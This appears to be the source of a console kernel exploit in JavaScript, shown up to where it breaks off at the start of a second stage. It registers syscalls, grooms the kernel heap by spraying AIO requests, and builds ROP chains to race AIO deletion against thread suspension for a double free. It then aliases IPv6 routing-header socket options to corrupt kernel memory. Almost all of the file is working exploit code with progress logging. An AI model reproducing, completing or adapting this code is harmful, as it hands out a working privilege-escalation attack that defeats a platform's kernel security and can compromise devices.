include('kernel.js');
if (!String.prototype.padStart) {
  String.prototype.padStart = function padStart(targetLength, padString) {
    targetLength = targetLength >> 0; // truncate if number or convert non-number to 0
    padString = String(typeof padString !== 'undefined' ? padString : ' ');
    if (this.length > targetLength) {
      return String(this);
    } else {
      targetLength = targetLength - this.length;
      if (targetLength > padString.length) {
        padString += padString.repeat(targetLength / padString.length); // append to original to ensure we are longer than needed
      }
      return padString.slice(0, targetLength) + String(this);
    }
  };
}
var FW_VERSION = null;
var PAGE_SIZE = 0x4000;
var MAIN_CORE = 4;
var MAIN_RTPRIO = 0x100;
var NUM_WORKERS = 2;
var NUM_GROOMS = 0x200;
var NUM_HANDLES = 0x100;
var NUM_SDS = 64;
var NUM_SDS_ALT = 48;
var NUM_RACES = 100;
var NUM_ALIAS = 100;
var LEAK_LEN = 16;
var NUM_LEAKS = 32;
var NUM_CLOBBERS = 8;
var MAX_AIO_IDS = 0x80;
var AIO_CMD_READ = 1;
var AIO_CMD_FLAG_MULTI = 0x1000;
var AIO_CMD_MULTI_READ = 0x1001;
var AIO_CMD_WRITE = 2;
var AIO_STATE_COMPLETE = 3;
var AIO_STATE_ABORTED = 4;
var SCE_KERNEL_ERROR_ESRCH = 0x80020003;
var RTP_LOOKUP = 0;
var RTP_SET = 1;
var PRI_REALTIME = 2;
var block_fd = 0xffffffff;
var unblock_fd = 0xffffffff;
var block_id = 0xffffffff;
var groom_ids = null;
var sds = null;
var sds_alt = null;
var prev_core = -1;
var prev_rtprio = 0;
var ready_signal = new BigInt(0);
var deletion_signal = new BigInt(0);
var pipe_buf = new BigInt(0);
var sd_pair = null;
var saved_fpu_ctrl = 0;
var saved_mxcsr = 0;

// Socket constants - only define if not already in scope
// (inject.js defines some of these as const in the eval scope)
var AF_UNIX = 1;
var AF_INET = 2;
var AF_INET6 = 28;
var SOCK_STREAM = 1;
var SOCK_DGRAM = 2;
var IPPROTO_TCP = 6;
var IPPROTO_UDP = 17;
var IPPROTO_IPV6 = 41;
var SOL_SOCKET = 0xFFFF;
var SO_REUSEADDR = 4;
var SO_LINGER = 0x80;

// IPv6 socket options
var IPV6_PKTINFO = 46;
var IPV6_NEXTHOP = 48;
var IPV6_RTHDR = 51;
var IPV6_TCLASS = 61;
var IPV6_2292PKTOPTIONS = 25;

// TCP socket options
var TCP_INFO = 32;
var TCPS_ESTABLISHED = 4;
var size_tcp_info = 0xec; /* struct tcp_info */

// Create shorthand references
fn.register(42, 'pipe', ['bigint'], 'bigint');
var pipe = fn.pipe;
fn.register(20, 'getpid', [], 'bigint');
var getpid = fn.getpid;
fn.register(0x18, 'getuid', [], 'bigint');
var getuid = fn.getuid;
fn.register(98, 'connect', ['bigint', 'bigint', 'number'], 'bigint');
var connect = fn.connect;
fn.register(0x49, 'munmap', ['bigint', 'number'], 'bigint');
var munmap = fn.munmap;
fn.register(0x76, 'getsockopt', ['bigint', 'number', 'number', 'bigint', 'bigint'], 'bigint');
var getsockopt = fn.getsockopt;
fn.register(0x87, 'socketpair', ['number', 'number', 'number', 'bigint'], 'bigint');
var socketpair = fn.socketpair;
fn.register(0xF0, 'nanosleep', ['bigint'], 'bigint');
var nanosleep = fn.nanosleep;
fn.register(0x1C7, 'thr_new', ['bigint', 'bigint'], 'bigint');
var thr_new = fn.thr_new;
fn.register(0x1D2, 'rtprio_thread', ['number', 'number', 'bigint'], 'bigint');
var rtprio_thread = fn.rtprio_thread;
fn.register(477, 'mmap', ['bigint', 'number', 'number', 'number', 'bigint', 'number'], 'bigint');
var mmap = fn.mmap;
fn.register(0x1E7, 'cpuset_getaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint');
var cpuset_getaffinity = fn.cpuset_getaffinity;
fn.register(0x1E8, 'cpuset_setaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint');
var cpuset_setaffinity = fn.cpuset_setaffinity;
fn.register(0x21A, 'evf_create', ['bigint', 'number', 'number'], 'bigint');
var evf_create = fn.evf_create;
fn.register(0x220, 'evf_set', ['bigint', 'number'], 'bigint');
var evf_set = fn.evf_set;
fn.register(0x221, 'evf_clear', ['bigint', 'number'], 'bigint');
var evf_clear = fn.evf_clear;
fn.register(0x21b, 'evf_delete', ['bigint'], 'bigint');
var evf_delete = fn.evf_delete;
fn.register(0x249, 'is_in_sandbox', [], 'bigint');
var is_in_sandbox = fn.is_in_sandbox;
fn.register(0x279, 'thr_resume_ucontext', ['bigint'], 'bigint');
var thr_resume_ucontext = fn.thr_resume_ucontext;
fn.register(0x296, 'aio_multi_delete', ['bigint', 'number', 'bigint'], 'bigint');
var aio_multi_delete = fn.aio_multi_delete;
fn.register(0x297, 'aio_multi_wait', ['bigint', 'number', 'bigint', 'number', 'number'], 'bigint');
var aio_multi_wait = fn.aio_multi_wait;
fn.register(0x298, 'aio_multi_poll', ['bigint', 'number', 'bigint'], 'bigint');
var aio_multi_poll = fn.aio_multi_poll;
fn.register(0x29A, 'aio_multi_cancel', ['bigint', 'number', 'bigint'], 'bigint');
var aio_multi_cancel = fn.aio_multi_cancel;
fn.register(0x29D, 'aio_submit_cmd', ['number', 'bigint', 'number', 'number', 'bigint'], 'bigint');
var aio_submit_cmd = fn.aio_submit_cmd;
fn.register(0x61, 'socket', ['number', 'number', 'number'], 'bigint');
var socket = fn.socket;
fn.register(0x69, 'setsockopt', ['bigint', 'number', 'number', 'bigint', 'number'], 'bigint');
var setsockopt = fn.setsockopt;
fn.register(0x68, 'bind', ['bigint', 'bigint', 'number'], 'bigint');
var bind = fn.bind;
fn.register(0x3, 'read', ['bigint', 'bigint', 'bigint'], 'bigint');
var read = fn.read;
fn.register(0x4, 'write', ['bigint', 'bigint', 'bigint'], 'bigint');
var write = fn.write;
fn.register(0x6, 'close', ['bigint'], 'bigint');
var close = fn.close;
fn.register(0x1e, 'accept', ['bigint', 'bigint', 'bigint'], 'bigint');
var accept = fn.accept;
fn.register(0x6a, 'listen', ['bigint', 'number'], 'bigint');
var listen = fn.listen;
fn.register(0x20, 'getsockname', ['bigint', 'bigint', 'bigint'], 'bigint');
var getsockname = fn.getsockname;
fn.register(libc_addr.add(0x6CA00), 'setjmp', ['bigint'], 'bigint');
var setjmp = fn.setjmp;
var longjmp_addr = libc_addr.add(0x6CA50);

// Extract syscall wrapper addresses for ROP chains from syscalls.map
var read_wrapper = syscalls.map.get(0x03);
var write_wrapper = syscalls.map.get(0x04);
var sched_yield_wrapper = syscalls.map.get(0x14b);
var thr_suspend_ucontext_wrapper = syscalls.map.get(0x278);
var cpuset_setaffinity_wrapper = syscalls.map.get(0x1e8);
var rtprio_thread_wrapper = syscalls.map.get(0x1D2);
var aio_multi_delete_wrapper = syscalls.map.get(0x296);
var thr_exit_wrapper = syscalls.map.get(0x1af);
var BigInt_Error = new BigInt(0xFFFFFFFF, 0xFFFFFFFF);
function init_threading() {
  var jmpbuf = malloc(0x60);
  setjmp(jmpbuf);
  saved_fpu_ctrl = Number(read32(jmpbuf.add(0x40)));
  saved_mxcsr = Number(read32(jmpbuf.add(0x44)));
}
function pin_to_core(core) {
  var mask = malloc(0x10);
  write32(mask, 1 << core);
  cpuset_setaffinity(3, 1, new BigInt(0xFFFFFFFF, 0xFFFFFFFF), 0x10, mask);
}
function get_core_index(mask_addr) {
  var num = read32(mask_addr);
  var position = 0;
  while (num > 0) {
    num = num >>> 1;
    position++;
  }
  return position - 1;
}
function get_current_core() {
  var mask = malloc(0x10);
  cpuset_getaffinity(3, 1, new BigInt(0xFFFFFFFF, 0xFFFFFFFF), 0x10, mask);
  return get_core_index(mask);
}
function set_rtprio(prio) {
  var rtprio = malloc(0x4);
  write16(rtprio, PRI_REALTIME);
  write16(rtprio.add(2), prio);
  rtprio_thread(RTP_SET, 0, rtprio);
}
function get_rtprio() {
  var rtprio = malloc(0x4);
  write16(rtprio, PRI_REALTIME);
  write16(rtprio.add(2), 0);
  rtprio_thread(RTP_LOOKUP, 0, rtprio);
  return Number(read16(rtprio.add(2)));
}
function aio_submit_cmd_fun(cmd, reqs, num_reqs, priority, ids) {
  var result = aio_submit_cmd(cmd, reqs, num_reqs, priority, ids);
  if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
    throw new Error('aio_submit_cmd error: ' + hex(result));
  }
  return result;
}
function aio_multi_cancel_fun(ids, num_ids, states) {
  var result = aio_multi_cancel(ids, num_ids, states);
  if (result.eq(BigInt_Error)) {
    throw new Error('aio_multi_cancel error: ' + hex(result));
  }
  return result;
}
function aio_multi_poll_fun(ids, num_ids, states) {
  var result = aio_multi_poll(ids, num_ids, states);
  if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
    throw new Error('aio_multi_poll error: ' + hex(result));
  }
  return result;
}
function aio_multi_wait_fun(ids, num_ids, states, mode, timeout) {
  var result = aio_multi_wait(ids, num_ids, states, mode, timeout);
  if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
    throw new Error('aio_multi_wait error: ' + hex(result));
  }
  return result;
}
function aio_multi_delete_fun(ids, num_ids, states) {
  var result = aio_multi_delete(ids, num_ids, states);
  if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
    throw new Error('aio_multi_delete error: ' + hex(result));
  }
  return result;
}
function make_reqs1(num_reqs) {
  var reqs = malloc(0x28 * num_reqs);
  for (var i = 0; i < num_reqs; i++) {
    write32(reqs.add(i * 0x28 + 0x20), 0xFFFFFFFF);
  }
  return reqs;
}
function spray_aio(loops, reqs, num_reqs, ids, multi) {
  var cmd = arguments.length > 5 && arguments[5] !== undefined ? arguments[5] : AIO_CMD_READ;
  loops = loops || 1;
  if (multi === undefined) multi = true;
  var step = 4 * (multi ? num_reqs : 1);
  var final_cmd = cmd | (multi ? AIO_CMD_FLAG_MULTI : 0);
  for (var i = 0; i < loops; i++) {
    aio_submit_cmd_fun(final_cmd, reqs, num_reqs, 3, new BigInt(Number(ids) + i * step));
  }
}
function cancel_aios(ids, num_ids) {
  var len = MAX_AIO_IDS;
  var rem = num_ids % len;
  var num_batches = Math.floor((num_ids - rem) / len);
  var errors = malloc(4 * len);
  for (var i = 0; i < num_batches; i++) {
    aio_multi_cancel_fun(new BigInt(Number(ids) + i * 4 * len), len, errors);
  }
  if (rem > 0) {
    aio_multi_cancel_fun(new BigInt(Number(ids) + num_batches * 4 * len), rem, errors);
  }
}
function free_aios(ids, num_ids) {
  var do_cancel = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : true;
  var len = MAX_AIO_IDS;
  var rem = num_ids % len;
  var num_batches = Math.floor((num_ids - rem) / len);
  var errors = malloc(4 * len);
  for (var i = 0; i < num_batches; i++) {
    var addr = new BigInt(Number(ids) + i * 4 * len);
    if (do_cancel) {
      aio_multi_cancel_fun(addr, len, errors);
    }
    aio_multi_poll_fun(addr, len, errors);
    aio_multi_delete_fun(addr, len, errors);
  }
  if (rem > 0) {
    var _addr = new BigInt(Number(ids) + num_batches * 4 * len);
    if (do_cancel) {
      aio_multi_cancel_fun(_addr, rem, errors);
    }
    aio_multi_poll_fun(_addr, rem, errors);
    aio_multi_delete_fun(_addr, rem, errors);
  }
}
function free_aios2(ids, num_ids) {
  free_aios(ids, num_ids, false);
}
function aton(ip_str) {
  var parts = ip_str.split('.').map(Number);
  if (parts.length !== 4 || parts.some(part => isNaN(part) || part < 0 || part > 255)) {
    throw new Error('Invalid IPv4 address: ' + ip_str);
  }
  return parts[3] << 24 | parts[2] << 16 | parts[1] << 8 | parts[0];
}
function new_tcp_socket() {
  var sd = socket(AF_INET, SOCK_STREAM, 0);
  if (sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
    throw new Error('new_tcp_socket error: ' + hex(sd));
  }
  return sd;
}
function new_socket() {
  var sd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
  if (sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
    throw new Error('new_socket error: ' + hex(sd));
  }
  return sd;
}
function create_pipe() {
  var fildes = malloc(0x10);
  var result = pipe(fildes);
  if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
    throw new Error('pipe syscall failed');
  }
  var read_fd = new BigInt(read32(fildes)); // easier to have BigInt for upcoming usage
  var write_fd = new BigInt(read32(fildes.add(4))); // easier to have BigInt for upcoming usage
  return [read_fd, write_fd];
}
function spawn_thread(rop_race1_array) {
  var rop_race1_addr = malloc(0x400); // ROP Stack plus extra size
  // log("This is rop_race1_array.length " + rop_race1_array.length);
  // Fill ROP Stack
  for (var i = 0; i < rop_race1_array.length; i++) {
    write64(rop_race1_addr.add(i * 8), rop_race1_array[i]);
    // log("This is what I wrote: " + hex(read64(rop_race1_addr.add(i*8))));
  }
  var jmpbuf = malloc(0x60);

  // FreeBSD amd64 jmp_buf layout:
  // 0x00: RIP, 0x08: RBX, 0x10: RSP, 0x18: RBP, 0x20-0x38: R12-R15, 0x40: FPU, 0x44: MXCSR
  write64(jmpbuf.add(0x00), gadgets.RET); // RIP - ret gadget
  write64(jmpbuf.add(0x10), rop_race1_addr); // RSP - pivot to ROP chain
  write32(jmpbuf.add(0x40), saved_fpu_ctrl); // FPU control
  write32(jmpbuf.add(0x44), saved_mxcsr); // MXCSR

  var stack_size = new BigInt(0x400);
  var tls_size = new BigInt(0x40);
  var thr_new_args = malloc(0x80);
  var tid_addr = malloc(0x8);
  var cpid = malloc(0x8);
  var stack = malloc(Number(stack_size));
  var tls = malloc(Number(tls_size));
  write64(thr_new_args.add(0x00), longjmp_addr); // start_func = longjmp
  write64(thr_new_args.add(0x08), jmpbuf); // arg = jmpbuf
  write64(thr_new_args.add(0x10), stack); // stack_base
  write64(thr_new_args.add(0x18), stack_size); // stack_size
  write64(thr_new_args.add(0x20), tls); // tls_base
  write64(thr_new_args.add(0x28), tls_size); // tls_size
  write64(thr_new_args.add(0x30), tid_addr); // child_tid (output)
  write64(thr_new_args.add(0x38), cpid); // parent_tid (output)

  var result = thr_new(thr_new_args, new BigInt(0x68));
  if (!result.eq(0)) {
    throw new Error('thr_new failed: ' + hex(result));
  }
  return read64(tid_addr);
}
function nanosleep_fun(nsec) {
  var timespec = malloc(0x10);
  write64(timespec, Math.floor(nsec / 1e9)); // tv_sec
  write64(timespec.add(8), nsec % 1e9); // tv_nsec
  nanosleep(timespec);
}
function wait_for(addr, threshold) {
  while (!read64(addr).eq(new BigInt(threshold))) {
    nanosleep_fun(1);
  }
}
function call_suspend_chain(pipe_write_fd, pipe_buf, thr_tid) {
  var insts = [];
  if (!sched_yield_wrapper || !thr_suspend_ucontext_wrapper || !write_wrapper) {
    throw new Error('Required syscall wrappers not available for ROP chain');
  }

  // write(pipe_write_fd, pipe_buf, 1) - using per-syscall gadget
  insts.push(gadgets.POP_RDI_RET);
  insts.push(pipe_write_fd);
  insts.push(gadgets.POP_RSI_RET);
  insts.push(pipe_buf);
  insts.push(gadgets.POP_RDX_RET);
  insts.push(new BigInt(1));
  insts.push(write_wrapper);

  // sched_yield() - using per-syscall gadget
  insts.push(sched_yield_wrapper);

  // thr_suspend_ucontext(thr_tid) - using per-syscall gadget
  insts.push(gadgets.POP_RDI_RET); // pop rdi ; ret
  insts.push(thr_tid);
  insts.push(thr_suspend_ucontext_wrapper);

  // return value in rax is stored by rop.store()

  var store_size = 0x10; // 2 slots 1 for RBP and another for last syscall ret value
  var store_addr = mem.malloc(store_size);
  rop.store(insts, store_addr, 1);
  rop.execute(insts, store_addr, store_size);
  return read64(store_addr.add(8)); // return value for 2nd slot
}
function race_one(req_addr, tcp_sd, sds) {
  try {
    if (!cpuset_setaffinity_wrapper || !rtprio_thread_wrapper || !read_wrapper || !aio_multi_delete_wrapper || !thr_exit_wrapper) {
      throw new Error('Required syscall wrappers not available for ROP chain');
    }

    // log("this is ready_signal and deletion_signal " + hex(ready_signal) + " " + hex(deletion_signal));
    write64(ready_signal, 0);
    write64(deletion_signal, 0);
    var sce_errs = malloc(0x100); // 8 bytes for errs + scratch for TCP_INFO
    write32(sce_errs, 0xFFFFFFFF); // -1
    write32(sce_errs.add(4), 0xFFFFFFFF); // -1
    // log("race_one before pipe");
    var pipe_fds = create_pipe();
    var pipe_read_fd = pipe_fds[0];
    var pipe_write_fd = pipe_fds[1];
    // const [pipe_read_fd, pipe_write_fd] = create_pipe();
    // log("race_one after pipe");

    var rop_race1 = [];
    rop_race1.push(new BigInt(0)); // first element overwritten by longjmp, skip it

    var cpu_mask = malloc(0x10);
    write16(cpu_mask, 1 << MAIN_CORE);

    // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
    rop_race1.push(gadgets.POP_RDI_RET);
    rop_race1.push(new BigInt(3)); // CPU_LEVEL_WHICH
    rop_race1.push(gadgets.POP_RSI_RET);
    rop_race1.push(new BigInt(1)); // CPU_WHICH_TID
    rop_race1.push(gadgets.POP_RDX_RET);
    rop_race1.push(new BigInt(0xFFFFFFFF, 0xFFFFFFFF)); // id = -1 (current thread)
    rop_race1.push(gadgets.POP_RCX_RET);
    rop_race1.push(new BigInt(0x10)); // setsize
    rop_race1.push(gadgets.POP_R8_RET);
    rop_race1.push(cpu_mask);
    rop_race1.push(cpuset_setaffinity_wrapper);
    var rtprio_buf = malloc(4);
    write16(rtprio_buf, PRI_REALTIME);
    write16(rtprio_buf.add(2), MAIN_RTPRIO);

    // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
    rop_race1.push(gadgets.POP_RDI_RET);
    rop_race1.push(new BigInt(1)); // RTP_SET
    rop_race1.push(gadgets.POP_RSI_RET);
    rop_race1.push(new BigInt(0)); // lwpid = 0 (current thread)
    rop_race1.push(gadgets.POP_RDX_RET);
    rop_race1.push(rtprio_buf);
    rop_race1.push(rtprio_thread_wrapper);

    // Signal ready - write 1 to ready_signal
    rop_race1.push(gadgets.POP_RDI_RET);
    rop_race1.push(ready_signal);
    rop_race1.push(gadgets.POP_RAX_RET);
    rop_race1.push(new BigInt(1));
    rop_race1.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

    // Read from pipe (blocks here) - read(pipe_read_fd, pipe_buf, 1)
    rop_race1.push(gadgets.POP_RDI_RET);
    rop_race1.push(pipe_read_fd);
    rop_race1.push(gadgets.POP_RSI_RET);
    rop_race1.push(pipe_buf);
    rop_race1.push(gadgets.POP_RDX_RET);
    rop_race1.push(new BigInt(1));
    rop_race1.push(read_wrapper);

    // aio multi delete - aio_multi_delete(req_addr, 1, sce_errs + 4)
    rop_race1.push(gadgets.POP_RDI_RET);
    rop_race1.push(req_addr);
    rop_race1.push(gadgets.POP_RSI_RET);
    rop_race1.push(new BigInt(1));
    rop_race1.push(gadgets.POP_RDX_RET);
    rop_race1.push(sce_errs.add(4));
    rop_race1.push(aio_multi_delete_wrapper);

    // Signal deletion - write 1 to deletion_signal
    rop_race1.push(gadgets.POP_RDI_RET); // pop rdi ; ret
    rop_race1.push(deletion_signal);
    rop_race1.push(gadgets.POP_RAX_RET);
    rop_race1.push(new BigInt(1));
    rop_race1.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

    // Thread exit - thr_exit(0)
    rop_race1.push(gadgets.POP_RDI_RET);
    rop_race1.push(new BigInt(0));
    rop_race1.push(thr_exit_wrapper);

    // log("race_one before spawnt_thread");
    var thr_tid = spawn_thread(rop_race1);
    // log("race_one after spawnt_thread");

    // Wait for thread to signal ready
    wait_for(ready_signal, 1);
    // log("race_one after wait_for");

    var suspend_res = call_suspend_chain(pipe_write_fd, pipe_buf, thr_tid);
    log('Suspend result: ' + hex(suspend_res));
    // log("race_one after call_suspend_chain");

    var scratch = sce_errs.add(8); // Use offset for scratch space
    aio_multi_poll_fun(req_addr, 1, scratch);
    var poll_res = read32(scratch);
    log('poll_res after suspend: ' + hex(poll_res));
    // log("race_one after aio_multi_poll_fun");

    get_sockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, scratch, size_tcp_info);
    var tcp_state = read8(scratch);
    log('tcp_state: ' + hex(tcp_state));
    var won_race = false;
    if (poll_res !== SCE_KERNEL_ERROR_ESRCH && tcp_state !== TCPS_ESTABLISHED) {
      aio_multi_delete_fun(req_addr, 1, sce_errs);
      won_race = true;
      log('Race won!');
    } else {
      log('Race not won (poll_res=' + hex(poll_res) + ' tcp_state=' + hex(tcp_state) + ')');
    }
    var resume_result = thr_resume_ucontext(thr_tid);
    log('Resume ' + hex(thr_tid) + ': ' + resume_result);
    // log("race_one after thr_resume_ucontext");
    nanosleep_fun(5);
    if (won_race) {
      var err_main_thr = read32(sce_errs);
      var err_worker_thr = read32(sce_errs.add(4));
      log('sce_errs: main=' + hex(err_main_thr) + ' worker=' + hex(err_worker_thr));
      if (err_main_thr === err_worker_thr && err_main_thr === 0) {
        log('Double-free successful, making aliased rthdrs...');
        var _sd_pair = make_aliased_rthdrs(sds);
        if (_sd_pair !== null) {
          close(pipe_read_fd);
          close(pipe_write_fd);
          return _sd_pair;
        } else {
          log('Failed to make aliased rthdrs');
        }
      } else {
        log('sce_errs mismatch - race failed');
      }
    }
    close(pipe_read_fd);
    close(pipe_write_fd);
    return null;
  } catch (e) {
    log('  race_one error: ' + e.message);
    return null;
  }
}
function build_rthdr(buf, size) {
  var len = (size >> 3) - 1 & ~1;
  var actual_size = len + 1 << 3;
  write8(buf, 0);
  write8(buf.add(1), len);
  write8(buf.add(2), 0);
  write8(buf.add(3), len >> 1);
  return actual_size;
}
function set_sockopt(sd, level, optname, optval, optlen) {
  var result = setsockopt(sd, level, optname, optval, optlen);
  if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
    throw new Error('set_sockopt error: ' + hex(result));
  }
  return result;
}
function get_sockopt(sd, level, optname, optval, optlen) {
  var len_ptr = malloc(4);
  write32(len_ptr, optlen);
  var result = getsockopt(sd, level, optname, optval, len_ptr);
  if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
    throw new Error('get_sockopt error: ' + hex(result));
  }
  return read32(len_ptr);
}
function set_rthdr(sd, buf, len) {
  return set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}
function get_rthdr(sd, buf, max_len) {
  return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
}
function free_rthdrs(sds) {
  for (var sd of sds) {
    if (!sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
      set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0);
    }
  }
}
function make_aliased_rthdrs(sds) {
  var marker_offset = 4;
  var size = 0x80;
  var buf = malloc(size);
  var rsize = build_rthdr(buf, size);
  for (var loop = 1; loop <= NUM_ALIAS; loop++) {
    for (var i = 1; i <= Math.min(sds.length, NUM_SDS); i++) {
      var sd = sds[i - 1];
      if (!sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        // sds[i-1] !== 0xffffffffffffffff
        write32(buf.add(marker_offset), i);
        set_rthdr(sd, buf, rsize);
      }
    }
    for (var _i = 1; _i <= Math.min(sds.length, NUM_SDS); _i++) {
      var _sd = sds[_i - 1];
      if (!_sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        // sds[i-1] !== 0xffffffffffffffff
        get_rthdr(_sd, buf, size);
        var marker = Number(read32(buf.add(marker_offset)));
        if (marker !== _i && marker > 0 && marker <= NUM_SDS) {
          var aliased_idx = marker - 1;
          var aliased_sd = sds[aliased_idx];
          if (aliased_idx >= 0 && aliased_idx < sds.length && !aliased_sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
            // sds[aliased_idx] !== 0xffffffffffffffff
            log('  Aliased pktopts found');
            var _sd_pair2 = [_sd, aliased_sd];
            var max_idx = Math.max(_i - 1, aliased_idx);
            var min_idx = Math.min(_i - 1, aliased_idx);
            sds.splice(max_idx, 1);
            sds.splice(min_idx, 1);
            free_rthdrs(sds);
            sds.push(new_socket());
            sds.push(new_socket());
            return _sd_pair2;
          }
        }
      }
    }
  }
  return null;
}
function setup() {
  try {
    init_threading();
    ready_signal = malloc(8);
    deletion_signal = malloc(8);
    pipe_buf = malloc(8);
    write64(ready_signal, 0);
    write64(deletion_signal, 0);
    prev_core = get_current_core();
    prev_rtprio = get_rtprio();
    pin_to_core(MAIN_CORE);
    set_rtprio(MAIN_RTPRIO);
    log('  Previous core ' + prev_core + ' Pinned to core ' + MAIN_CORE);
    var sockpair = malloc(8);
    var ret = socketpair(AF_UNIX, SOCK_STREAM, 0, sockpair);
    if (!ret.eq(0)) {
      return false;
    }
    block_fd = read32(sockpair);
    unblock_fd = read32(sockpair.add(4));
    var block_reqs = malloc(0x28 * NUM_WORKERS);
    for (var i = 0; i < NUM_WORKERS; i++) {
      var offset = i * 0x28;
      write32(block_reqs.add(offset).add(0x08), 1);
      write32(block_reqs.add(offset).add(0x20), block_fd);
    }
    var block_id_buf = malloc(4);
    ret = aio_submit_cmd_fun(AIO_CMD_READ, block_reqs, NUM_WORKERS, 3, block_id_buf);
    if (!ret.eq(0)) {
      return false;
    }
    block_id = read32(block_id_buf);
    log('  AIO workers ready');
    var num_reqs = 3;
    var groom_reqs = make_reqs1(num_reqs);
    var groom_ids_addr = malloc(4 * NUM_GROOMS);
    spray_aio(NUM_GROOMS, groom_reqs, num_reqs, groom_ids_addr, false);
    cancel_aios(groom_ids_addr, NUM_GROOMS);
    groom_ids = [];
    for (var _i2 = 0; _i2 < NUM_GROOMS; _i2++) {
      groom_ids.push(Number(read32(groom_ids_addr.add(_i2 * 4))));
    }
    sds = [new BigInt(0), new BigInt(0)];
    var sdsIdx = 0;
    for (var _i3 = 0; _i3 < NUM_SDS; _i3++) {
      var sd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
      if (sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        throw new Error('socket alloc failed at sds[' + _i3 + '] - reboot system');
      }
      sds[sdsIdx++] = sd;
    }
    sds_alt = [new BigInt(0), new BigInt(0)];
    var sdsAltIdx = 0;
    for (var _i4 = 0; _i4 < NUM_SDS_ALT; _i4++) {
      var _sd2 = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
      if (_sd2.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        throw new Error('socket alloc failed at sds_alt[' + _i4 + '] - reboot system');
      }
      sds_alt[sdsAltIdx++] = _sd2;
    }
    log('  Sockets allocated (' + NUM_SDS + ' + ' + NUM_SDS_ALT + ')');
    return true;
  } catch (e) {
    log('  Setup failed: ' + e.message);
    return false;
  }
}
function double_free_reqs2() {
  try {
    var server_addr = malloc(16);
    write8(server_addr.add(1), AF_INET);
    write16(server_addr.add(2), 0);
    write32(server_addr.add(4), aton('127.0.0.1'));
    var sd_listen = new_tcp_socket();
    var enable = malloc(4);
    write32(enable, 1);
    set_sockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, enable, 4);
    var ret = bind(sd_listen, server_addr, 16);
    if (!ret.eq(0)) {
      log('bind failed');
      close(sd_listen);
      return null;
    }
    var addr_len = malloc(4);
    write32(addr_len, 16);
    ret = getsockname(sd_listen, server_addr, addr_len);
    if (!ret.eq(0)) {
      log('getsockname failed');
      close(sd_listen);
      return null;
    }
    log('Bound to port: ' + Number(read16(server_addr.add(2))));
    ret = listen(sd_listen, 1);
    if (!ret.eq(0)) {
      log('listen failed');
      close(sd_listen);
      return null;
    }
    var num_reqs = 3;
    var which_req = num_reqs - 1;
    var reqs = make_reqs1(num_reqs);
    var aio_ids = malloc(4 * num_reqs);
    var req_addr = aio_ids.add(which_req * 4);
    var errors = malloc(4 * num_reqs);
    var cmd = AIO_CMD_MULTI_READ;
    for (var attempt = 1; attempt <= NUM_RACES; attempt++) {
      // log("Race attempt " + attempt + "/" + NUM_RACES);

      var sd_client = new_tcp_socket();
      ret = connect(sd_client, server_addr, 16);
      if (!ret.eq(0)) {
        close(sd_client);
        continue;
      }
      var sd_conn = accept(sd_listen, new BigInt(0), new BigInt(0));
      // log("Race attempt after accept")
      var linger_buf = malloc(8);
      write32(linger_buf, 1);
      write32(linger_buf.add(4), 1);
      set_sockopt(sd_client, SOL_SOCKET, SO_LINGER, linger_buf, 8);
      // log("Race attempt after set_sockopt")
      write32(reqs.add(which_req * 0x28 + 0x20), Number(sd_client));
      ret = aio_submit_cmd_fun(cmd, reqs, num_reqs, 3, aio_ids);
      if (!ret.eq(0)) {
        close(sd_client);
        close(sd_conn);
        continue;
      }
      // log("Race attempt after aio_submit_cmd_fun")
      aio_multi_cancel_fun(aio_ids, num_reqs, errors);
      // log("Race attempt after aio_multi_cancel_fun")
      aio_multi_poll_fun(aio_ids, num_reqs, errors);
      // log("Race attempt after aio_multi_poll_fun")

      close(sd_client);
      // log("Race attempt before race_one")
      if (!sds) {
        close(sd_conn);
        close(sd_listen);
        throw Error('sds not initialized');
      }
      var _sd_pair3 = race_one(req_addr, sd_conn, sds);
      aio_multi_delete_fun(aio_ids, num_reqs, errors);
      close(sd_conn);
      if (_sd_pair3 !== null) {
        log('Won race at attempt ' + attempt);
        close(sd_listen);
        return _sd_pair3;
      }
    }
    close(sd_listen);
    return null;
  } catch (e) {
    log('Stage 1 error: ' + e.message);
    return null;
  }
}

// Stage 2
function new_evf(name, flags) {
  var result = evf_create(name, 0, flags);
  if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
    throw new Error('evf_create error: ' + hex(result));
  }
  return result;
}
function set_evf_flags(id, flags) {
  var result = evf_clear(id, 0);
  if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
    throw new Error('evf_clear error: ' + hex(result));
  }
  result = evf_set(id, flags);
